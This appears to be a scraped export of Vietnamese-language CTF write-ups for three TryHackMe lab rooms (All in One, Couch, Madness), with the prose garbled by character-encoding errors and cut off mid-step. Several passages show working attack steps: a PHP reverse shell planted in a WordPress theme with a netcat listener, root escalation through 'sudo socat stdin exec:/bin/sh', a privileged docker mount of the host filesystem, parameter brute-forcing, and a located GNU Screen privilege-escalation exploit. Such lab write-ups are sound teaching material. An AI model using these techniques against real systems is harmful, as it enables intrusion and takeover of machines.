ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.6.0.191 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e25c3322765c9366cd969c166ab317a4 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLcG2O5LS7paG07xeOB/4E66h0/DIMR/keWMhbTxlA2cfzaDhYknqxCDdYBc9V3+K7iwduXT9jTFTX0C3NIKsVVYcsLxz6eFX3kUyZjnzxxaURPekEQ0BejITQuJRUz9hghT8IjAnQSTPeA+qBIB7AB+bCD39dgyta5laQcrlo0vebY70Y7FMODJlx4YGgnLce6j+PQjE8dz4oiDmrmBd/BBa9FxLj1bGobjB4CX323sEaXLj9XWkSKbc/49zGX7rhLWcUcy23gHwEHVfPdjkCGPr6oiYj5u6OamBuV/A6hFamq27+hQNh8GgiXSgdgGn/8IZFHZQrnh14WmO8xXW5 | 256 1b6a36e18eb4965ec6ef0d91375859b6 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBF1Ww9ui4NQDHA5l+lumRpLsAXHYNk4lkghej9obWBlOwnV+tIDw4mgmuO1C3U/WXRgn0GrESAnMpi1DSxy8t1k= | 256 fbfadbea4eed202b91189d58a06a50ec (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAOG6ExdDNH+xAyzd4w1G4E9sCfiiooQhmebQX6nIcH/ 80/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: POST OPTIONS HEAD GET |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Khi thá»­ truy cáº­p ftp vá»›i port 21 báº±ng user Anonymous, tÃ´i khÃ´ng thu Ä‘Æ°á»£c gÃ¬ vÃ¬ trong nÃ y trá»‘ng trÆ¡n. TÃ´i cÅ©ng thá»­ put file lÃªn nhÆ°ng khÃ´ng cÃ³ káº¿t quáº£.\nQuay láº¡i vá»›i web á»Ÿ port 80, dÃ¹ng dirsearch Ä‘á»ƒ tÃ¬m path áº©n\n[03:21:47] 301 - 316B - /wordpress -\u0026gt; http://10.10.248.46/wordpress/ [03:23:23] 200 - 197B - /hackathons Äiá»u nÃ y cÃ³ nghÄ©a lÃ  web Ä‘Æ°á»£c build báº±ng Wordpress. Tuy nhiÃªn trÆ°á»›c Ä‘Ã³ tÃ´i sáº½ vÃ o thá»­ path áº©n cÃ²n láº¡i. Xem source web cá»§a nÃ³ vÃ  tÃ´i cÃ³ 1 Ä‘oáº¡n encode\n\u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Damn how much I hate the smell of \u0026lt;i\u0026gt;Vinegar \u0026lt;/i\u0026gt; :/ !!! \u0026lt;/h1\u0026gt; \u0026lt;!-- Dvc W@iyur@123 --\u0026gt; \u0026lt;!-- KeepGoing --\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Sá»­ dá»¥ng CyberChef vá»›i key lÃ  KeepGoing\nLÆ°u Ä‘oáº¡n text nÃ y vÃ  quay trá»Ÿ láº¡i vá»›i wordpress\nTÃ´i cÃ³ 1 cÃ¡i tÃªn á»Ÿ Ä‘Ã¢y lÃ  elyana, cÅ©ng cÃ³ thá»ƒ lÃ  username luÃ´n.\nSá»­ dá»¥ng wpscan Ä‘á»ƒ khai thÃ¡c vá» web nÃ y.\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ wpscan --url http://10.10.68.232/wordpress/ -e vp,u _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ Â® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.22 @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [i] Updating the Database ... [i] Update completed. [+] URL: http://10.10.68.232/wordpress/ [10.10.68.232] [+] Started: Thu Nov 17 02:31:59 2022 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.29 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.10.68.232/wordpress/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://10.10.68.232/wordpress/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://10.10.68.232/wordpress/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://10.10.68.232/wordpress/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01). | Found By: Rss Generator (Passive Detection) | - http://10.10.68.232/wordpress/index.php/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.5.1\u0026lt;/generator\u0026gt; | - http://10.10.68.232/wordpress/index.php/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.5.1\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentytwenty | Location: http://10.10.68.232/wordpress/wp-content/themes/twentytwenty/ | Last Updated: 2022-11-02T00:00:00.000Z | Readme: http://10.10.68.232/wordpress/wp-content/themes/twentytwenty/readme.txt | [!] The version is out of date, the latest version is 2.1 | Style URL: http://10.10.68.232/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5 | Style Name: Twenty Twenty | Style URI: https://wordpress.org/themes/twentytwenty/ | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.5 (80% confidence) | Found By: Style (Passive Detection) | - http://10.10.68.232/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5, Match: \u0026#39;Version: 1.5\u0026#39; [+] Enumerating Vulnerable Plugins (via Passive Methods) [+] Checking Plugin Versions (via Passive and Aggressive Methods) [i] No plugins Found. [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:02 \u0026lt;===============================================================================================================\u0026gt; (10 / 10) 100.00% Time: 00:00:02 [i] User(s) Identified: [+] elyana | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http://10.10.68.232/wordpress/index.php/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register Tá»« nhá»¯ng thÃ´ng tin trÃªn, tÃ´i thu Ä‘Æ°á»£c 1 wordpress vá»›i phiÃªn báº£n 5.5.1, nÃ³ Ä‘ang sá»­ dá»¥ng theme twentytwenty phiÃªn báº£n cÅ©, Ä‘Ã¢y cÃ³ thá»ƒ lÃ  1 lÆ°u Ã½ Ä‘á»ƒ thá»±c hiá»‡n RCE sau khi Ä‘Ã£ login Ä‘Æ°á»£c vÃ o wordpress.\nTiáº¿p theo lÃ  user elyana Ä‘Ãºng nhÆ° tÃ´i dá»± Ä‘oÃ¡n phÃ­a trÃªn. Váº­y thÃ¬ tÃ´i sáº½ thá»­ login wordpress vá»›i username elyana vÃ  pass lÃ  Ä‘oáº¡n text tÃ´i vá»«a tÃ¬m Ä‘Æ°á»£c\nTÃ´i thÃ nh cÃ´ng vá»›i elyana - H@ckme@123. Truy cáº­p vÃ o theme twentytwenty vÃ  sá»­a nÃ³ vá»›i shell php cá»§a tÃ´i, thay Ä‘á»•i Ä‘á»‹a chá»‰ ip vÃ  port báº±ng Ä‘á»‹a chá»‰ mÃ¡y cá»§a tÃ´i vÃ  update file.\nSau Ä‘Ã³ táº¡o listener vá»›i netcat: nc -lnvp 2402\nTruy cáº­p vÃ o link: http://10.10.183.28/wordpress/wp-content/themes/twentytwenty/404.php\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nc -lnvp 2402 listening on [any] 2402 ... connect to [10.6.0.191] from (UNKNOWN) [10.10.183.28] 54774 Linux elyana 4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 09:00:05 up 26 min, 0 users, load average: 0.00, 0.02, 0.29 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) $ SSH # $ cd /home $ ls elyana $ cd /home/elyana $ ls hint.txt user.txt $ cat user.txt cat: user.txt: Permission denied $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) $ cat hint.txt Elyana\u0026#39;s user password is hidden in the system. Find it ;) $ $ find / -type f -user elyana 2\u0026gt;/dev/null /home/elyana/user.txt /home/elyana/.bash_logout /home/elyana/hint.txt /home/elyana/.bash_history /home/elyana/.profile /home/elyana/.sudo_as_admin_successful /home/elyana/.bashrc /etc/mysql/conf.d/private.txt $ cat /etc/mysql/conf.d/private.txt user: elyana password: E@syR18ght $ Thá»­ login ssh vá»›i user elyana\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ ssh elyana@10.10.183.28 The authenticity of host \u0026#39;10.10.183.28 (10.10.183.28)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:Rm7wS3JV0q1IHCuI5dWaanuCoSlTYECCa9jTEE4BFsI. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.183.28\u0026#39; (ED25519) to the list of known hosts. elyana@10.10.183.28\u0026#39;s password: Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-118-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Thu Nov 17 09:11:29 UTC 2022 System load: 0.07 Processes: 116 Usage of /: 53.3% of 6.41GB Users logged in: 0 Memory usage: 62% IP address for eth0: 10.10.183.28 Swap usage: 0% 16 packages can be updated. 0 updates are security updates. Last login: Fri Oct 9 08:09:56 2020 -bash-4.4$ id uid=1000(elyana) gid=1000(elyana) groups=1000(elyana),4(adm),27(sudo),108(lxd) -bash-4.4$ -bash-4.4$ ls hint.txt user.txt -bash-4.4$ Privilege escalation # sudo -l\n-bash-4.4$ sudo -l Matching Defaults entries for elyana on elyana: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User elyana may run the following commands on elyana: (ALL) NOPASSWD: /usr/bin/socat socat | GTFOBins\n-bash-4.4$ sudo socat stdin exec:/bin/sh id uid=0(root) gid=0(root) groups=0(root) ls /root root.txt ","date":"30 March 2022","externalUrl":null,"permalink":"/ctf/tryhackme/all-in-one/","section":"Ctf","summary":"","title":"Tryhackme - All in One","type":"ctf"},{"content":"","date":"30 March 2022","externalUrl":null,"permalink":"/tags/wordpress/","section":"Tags","summary":"","title":"Wordpress","type":"tags"},{"content":"","date":"28 March 2022","externalUrl":null,"permalink":"/tags/couchdb/","section":"Tags","summary":"","title":"Couchdb","type":"tags"},{"content":"Xin chÃ o, láº¡i lÃ  tÃ´i Ä‘Ã¢y. HÃ´m nay tÃ´i sáº½ giáº£i CTF TryHackMe | Couch\nReconnaissance # Viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m lÃ  quÃ©t cÃ¡c cá»•ng Ä‘ang má»Ÿ trÃªn mÃ¡y chá»§ má»¥c tiÃªu\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 349d390934304b3da71edfeba3b0e5aa (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMXnGZUnLWqLZb8VQiVH0z85lV+G4KY5l5kKf1fS7YgSnfZ+k3CRjAZPuGceg5RQEUbOMCm+0u4SDyIEbwwAXGv0ORK4/VEIyJlZmtlqeyASwR8ML4yjdGqinqOUZ3jN/ZIg4veJ02nr86GZP+Nto0TZt7beaIxykMEZHTdo0CctdKLIet7PpvwG4F5Tn9MBoys9pUjfpcnwbf91Tv6i56Gipo07jKgb5vP8Nl1TXPjWB93WNW2vWEQ1J4tiyZlBeLOaNaEbxvNQFnKxjVYiiLCbcofwSdrwZ7/+sIy5BdiNW+k81rBN3OqaQNZ8urFaiXXf/ukRr/hhjY5a6m0MHn | 256 a42eef3a845d211bb9d42613a52ddf19 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNTR07g3p8MfnQVnv8uqj8GGDH6VoSRzwRFflMbEf3WspsYyVipg6vtNQMaq5uNGUXF8ubpsnHeJA+T3RilTLXc= | 256 e16d4dfdc8008e86c2132dc7ad85139c (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKLUyz2Tpwc5qPuFxV+HnGBeqLC6NWrmpmGmE0hk7Hlj 5984/tcp open http syn-ack CouchDB httpd 1.6.1 (Erlang OTP/18) |_http-server-header: CouchDB/1.6.1 (Erlang OTP/18) |_http-title: Site doesn\u0026#39;t have a title (text/plain; charset=utf-8). | http-methods: |_ Supported Methods: GET HEAD |_http-favicon: Unknown favicon MD5: 2AB2AAE806E8393B70970B2EAACE82E0 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Vá»›i port 5984 tÃ´i cÃ³ web console cá»§a CouchDB. Äá»c qua document cá»§a db nÃ y thÃ¬ tÃ´i tÃ¬m Ä‘Æ°á»£c path cá»§a web admin lÃ  /_utils\nÄá»ƒ list ra toÃ n bá»™ db trÃªn web browser tÃ´i dÃ¹ng path /_all_dbs\nDáº¡o qua cÃ¡c db nÃ y thÃ¬ tÃ´i tÃ¬m tháº¥y creds bÃªn trong db secret\nThá»­ login ssh\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ ssh atena@10.10.60.64 The authenticity of host \u0026#39;10.10.60.64 (10.10.60.64)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:QXIT4W/vOthS71YtOAr7s67oloxpMmr0GLRVL9iVFJM. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.60.64\u0026#39; (ED25519) to the list of known hosts. atena@10.10.60.64\u0026#39;s password: Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-193-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage Last login: Fri Dec 18 15:25:27 2020 from 192.168.85.1 atena@ubuntu:~$ id uid=1000(atena) gid=1000(atena) groups=1000(atena),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare) atena@ubuntu:~$ ls user.txt atena@ubuntu:~$ Privilege escalation # Thá»­ sudo -l hay find Ä‘á»u khÃ´ng cÃ³ káº¿t quáº£. NhÆ°ng khi ls -la Ä‘á»ƒ xem nhá»¯ng file áº©n á»Ÿ thÆ° má»¥c user atena, tÃ´i nháº­n ra file .bash_history cÃ³ size khÃ¡ lá»›n.\natena@ubuntu:~$ cat .bash_history sudo -s cd /etc/apt/ rm sources. rm sources.list wget https://gist.githubusercontent.com/rohitrawat/60a04e6ebe4a9ec1203eac3a11d4afc1/raw/fcdfde2ab57e455ba9b37077abf85a81c504a4a9/sources.list apt-get update apt-get dist-upgrade sudo apt-get install software-properties-common sudo add-apt-repository ppa:couchdb/stable sudo apt-get update sudo apt-get install couchdb sudo chown -R couchdb:couchdb /usr/bin/couchdb /etc/couchdb /usr/share/couchdb ... ... sudo deluser USERNAME sudo sudo deluser atena sudo exit sudo -s docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine uname -a exit á» Ä‘oáº¡n cuá»‘i nÃ y, tÃ´i Ä‘á»ƒ Ã½ tháº¥y root sá»­ dá»¥ng -s Ä‘á»ƒ láº¥y shell vÃ  thá»±c thi docker. TÃ´i sáº½ dÃ¹ng láº¡i cÃ¢u lá»‡nh nÃ y\natena@ubuntu:~$ docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpin / # id uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(fl / # cat /root/root.txt cat: can\u0026#39;t open \u0026#39;/root/root.txt\u0026#39;: No such file or directory / # ls /root / # find / -type f -name root.txt 2\u0026gt;/dev/null /mnt/root/root.txt / # ","date":"28 March 2022","externalUrl":null,"permalink":"/ctf/tryhackme/couch/","section":"Ctf","summary":"","title":"Tryhackme - Couch","type":"ctf"},{"content":"","date":"25 March 2022","externalUrl":null,"permalink":"/tags/crunch/","section":"Tags","summary":"","title":"Crunch","type":"tags"},{"content":"","date":"25 March 2022","externalUrl":null,"permalink":"/tags/screen-4.5.0/","section":"Tags","summary":"","title":"Screen-4.5.0","type":"tags"},{"content":"","date":"25 March 2022","externalUrl":null,"permalink":"/tags/steghide/","section":"Tags","summary":"","title":"Steghide","type":"tags"},{"content":"Xin chÃ o, láº¡i lÃ  tÃ´i Ä‘Ã¢y. HÃ´m nay tÃ´i sáº½ giáº£i CTF TryHackMe | Madness\nReconnaissance # Váº«n nhÆ° thÃ´ng thÆ°á»ng, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m lÃ  quÃ©t cÃ¡c cá»•ng Ä‘ang má»Ÿ trÃªn mÃ¡y chá»§ má»¥c tiÃªu.\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 acf9851052656e17f51c34e7d86467b1 (RSA) | 256 dd8e5aecb195cddc4d01b3fe5f4e12c1 (ECDSA) |_ 256 e9ede3eb58773b005e3af524d858348e (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.18 (Ubuntu) 2047/tcp filtered dls Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Truy cáº­p vÃ o web vá»›i port 80, Ä‘Ã¢y chá»‰ lÃ  1 trang máº·c Ä‘á»‹nh cá»§a apache. Thá»­ xem source code thÃ¬ tÃ´i tÃ¬m Ä‘Æ°á»£c 1 hint\n\u0026lt;div class=\u0026#34;page_header floating_element\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;[thm.jpg](view-source:http://10.10.187.164/thm.jpg)\u0026#34; class=\u0026#34;floating_element\u0026#34;/\u0026gt; \u0026lt;!-- They will never find me--\u0026gt; \u0026lt;span class=\u0026#34;floating_element\u0026#34;\u0026gt; Apache2 Ubuntu Default Page \u0026lt;/span\u0026gt; Háº³n lÃ  bá»©c áº£nh nÃ y cÃ³ gÃ¬ Ä‘Ã³ Ä‘áº·c biá»‡t nÃªn má»›i pháº£i bá»‹ giáº¥u Ä‘i, láº¥y nÃ³ vá» Ä‘á»ƒ phÃ¢n tÃ­ch.\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ wget http://10.10.187.164/thm.jpg --2022-11-06 22:06:43-- http://10.10.187.164/thm.jpg Connecting to 10.10.187.164:80... connected. HTTP request sent, awaiting response... 200 OK Length: 22210 (22K) [image/jpeg] Saving to: â€˜thm.jpgâ€™ thm.jpg 100%[====================================================================================================\u0026gt;] 21.69K 70.6KB/s in 0.3s 2022-11-06 22:06:44 (70.6 KB/s) - â€˜thm.jpgâ€™ saved [22210/22210] â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ exiftool thm.jpg ExifTool Version Number : 12.44 File Name : thm.jpg Directory : . File Size : 22 kB File Modification Date/Time : 2020:01:06 05:34:26-05:00 File Access Date/Time : 2022:11:06 22:10:29-05:00 File Inode Change Date/Time : 2022:11:06 22:10:29-05:00 File Permissions : -rw-r--r-- File Type : PNG File Type Extension : png MIME Type : image/png Warning : PNG image did not start with IHDR CÃ³ váº» nhÆ° áº£nh Ä‘ang bá»‹ sai Ä‘á»‹nh dáº¡ng nÃªn khÃ´ng thá»ƒ má»Ÿ Ä‘Æ°á»£c - Ä‘uÃ´i lÃ  jpg nhÆ°ng warning láº¡i nÃ³i lÃ  png. TÃ´i sáº½ dÃ¹ng hexed.it Ä‘á»ƒ phÃ¢n tÃ­ch nÃ³\nVá»›i 8 byte Ä‘áº§u nÃ y thÃ¬ Ä‘Ãºng lÃ  cá»§a file png nhÆ°ng theo nhÆ° warning phÃ­a trÃªn thÃ¬ IHDR sáº½ pháº£i lÃ  jpg má»›i. Váº­y nÃªn tÃ´i sáº½ Ä‘á»•i 8 byte Ä‘áº§u thÃ nh signatures cá»§a jpg\nExport áº£nh nÃ y vá», vÃ  bÃªn trong nÃ³ lÃ  1 path áº©n\nXem qua source cá»§a trang nÃ y tÃ´i tÃ¬m tháº¥y 1 hint ná»¯a\n\u0026lt;h2\u0026gt;Welcome! I have been expecting you!\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;To obtain my identity you need to guess my secret! \u0026lt;/p\u0026gt; \u0026lt;!-- It\u0026#39;s between 0-99 but I don\u0026#39;t think anyone will look here--\u0026gt; \u0026lt;p\u0026gt;Secret Entered: \u0026lt;/p\u0026gt; Váº­y lÃ  tÃ´i cÃ³ thá»ƒ Ä‘iá»n 1 sá»‘ nÃ o Ä‘Ã³ tá»« 0-99 vÃ o pháº§n Secret Entered:, nhÆ°ng láº¡i khÃ´ng cÃ³ pháº§n input nÃ o. Váº­y nÃªn tÃ´i nghÄ© ráº±ng tÃ´i cÃ³ thá»ƒ Ä‘iá»n trÃªn url.\nViá»‡c Ä‘áº§u tiÃªn tÃ´i sáº½ táº¡o wordlist sá»‘ 0-99 vá»›i crunch, cÃ¡ch táº¡o wordlist vá»›i crunch thÃ¬ nÃ³ á»Ÿ Ä‘Ã¢y\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ crunch 2 2 0123456789 -o numbers.txt Tiáº¿p theo dÃ¹ng ffuf Ä‘á»ƒ brute-force\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ ffuf -w numbers.txt -u http://10.10.187.164/th1s_1s_h1dd3n/?secret=FUZZ /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive \u0026lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.187.164/th1s_1s_h1dd3n/?secret=FUZZ :: Wordlist : FUZZ: numbers.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ 26 [Status: 200, Size: 408, Words: 45, Lines: 19, Duration: 310ms] 32 [Status: 200, Size: 408, Words: 45, Lines: 19, Duration: 309ms] 05 [Status: 200, Size: 408, Words: 45, Lines: 19, Duration: 310ms] 06 [Status: 200, Size: 408, Words: 45, Lines: 19, Duration: 311ms] 36 [Status: 200, Size: 408, Words: 45, Lines: 19, Duration: 312ms] ... Sau khi cháº¡y háº¿t, tÃ´i Ä‘á»ƒ Ã½ tháº¥y cÃ³ 1 path mÃ  Size cá»§a nÃ³ cao hÆ¡n nhiá»u so vá»›i cÃ¡c sá»‘ khÃ¡c Ä‘Ã³ lÃ  73 vá»›i Size: 445, nghÄ©a lÃ  kÃ½ tá»± cá»§a trang nÃ y nhiá»u hÆ¡n háº³n cÃ¡c trang khÃ¡c (407 hoáº·c 408).\nTÃ´i cÃ²n 1 phÆ°Æ¡ng phÃ¡p ná»¯a chÆ°a thá»­ Ä‘Ã³ lÃ  dÃ¹ng steghide vá»›i bá»©c áº£nh phÃ­a trÃªn. Thá»­ extract nÃ³ vá»›i pass vá»«a tÃ¬m Ä‘Æ°á»£c\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ steghide extract -sf thm. Enter passphrase: wrote extracted data to \u0026#34;hidden.txt\u0026#34;. â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ cat hidden.txt Fine you found the password! Here\u0026#39;s a username wbxre I didn\u0026#39;t say I would make it easy for you! Vá»›i hint lÃ  Rotten thÃ¬ tÃ´i sáº½ thá»­ decode username nÃ y vá»›i rot13 vÃ  nháº­n Ä‘Æ°á»£c username lÃ  joker.\nTrong lá»i nháº¯n cÃ³ nÃ³i tÃ´i Ä‘Ã£ tÃ¬m Ä‘Æ°á»£c password, nhÆ°ng tÃ´i cÃ³ tháº¥y password nÃ o á»Ÿ Ä‘Ã¢y Ä‘Ã¢u nhá»‰? ThÃªm ná»¯a tÃ´i khÃ´ng Ä‘Æ°á»£c brute-force vá»›i ssh nÃªn dÃ¹ cÃ³ thá»­ qua cÃ¡c pass cÃ³ liÃªn quan thÃ¬ cÅ©ng khÃ´ng thá»ƒ cÃ³ káº¿t quáº£\nÄáº¿n Ä‘Ã¢y thÃ¬ tÃ´i Ä‘Ã nh pháº£i tham kháº£o giáº£i thÃ­ch cá»§a nhá»¯ng ngÆ°á»i Ä‘Ã£ tá»«ng lÃ m. VÃ  hÃ³a ra cáº£ bá»©c áº£nh trong pháº§n giá»›i thiá»‡u cá»§a room nÃ y cÅ©ng lÃ  1 dá»¯ kiá»‡n. Tháº­t lÃ  khÃ´ng ngá» Ä‘áº¿n!!!\nThá»±c ra viá»‡c pháº£i tham kháº£o giáº£i thÃ­ch cá»§a ngÆ°á»i khÃ¡c Ä‘Ã£ lÃ m giáº£m há»©ng thÃº cá»§a tÃ´i vá»›i room nÃ y Ä‘i nhiá»u. NhÆ°ng Ä‘á»ƒ hoÃ n thÃ nh ná»‘t thÃ¬ tÃ´i sáº½ coi Ä‘áº¥y lÃ  1 hint ná»¯a. TÃ´i sáº½ láº¥y nÃ³ vá» vÃ  láº¡i extract vá»›i steghide\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ steghide extract -sf 5iW7kC8.jpg Enter passphrase: wrote extracted data to \u0026#34;password.txt\u0026#34;. â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ cat password.txt I didn\u0026#39;t think you\u0026#39;d find me! Congratulations! Here take my password *axA\u0026amp;GF8dP Login ssh\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ ssh joker@10.10.24.75 joker@10.10.24.75\u0026#39;s password: Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-170-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Sun Jan 5 18:51:33 2020 from 192.168.244.128 joker@ubuntu:~$ id uid=1000(joker) gid=1000(joker) groups=1000(joker) joker@ubuntu:~$ ls user.txt joker@ubuntu:~$ Privilege escalation # find / -type f -perm -u=s 2\u0026gt;/dev/null\njoker@ubuntu:~$ find / -type f -perm -u=s 2\u0026gt;/dev/null /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device /usr/bin/vmware-user-suid-wrapper /usr/bin/gpasswd /usr/bin/passwd /usr/bin/newgrp /usr/bin/chsh /usr/bin/chfn /usr/bin/sudo /bin/fusermount /bin/su /bin/ping6 /bin/screen-4.5.0 /bin/screen-4.5.0.old /bin/mount /bin/ping /bin/umount TÃ¬m exploit vá» screen-4.5.0 vÃ  tÃ´i tÃ¬m Ä‘Æ°á»£c trÃªn exploit-db.com\nXÃ¡c Ä‘á»‹nh vá»‹ trÃ­ cá»§a exploit vÃ  táº¡o local http server táº¡i Ä‘Ã³\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ searchsploit -p 41154 Exploit: GNU Screen 4.5.0 - Local Privilege Escalation URL: https://www.exploit-db.com/exploits/41154 Path: /usr/share/exploitdb/exploits/linux/local/41154.sh File Type: Bourne-Again shell script, ASCII text executable 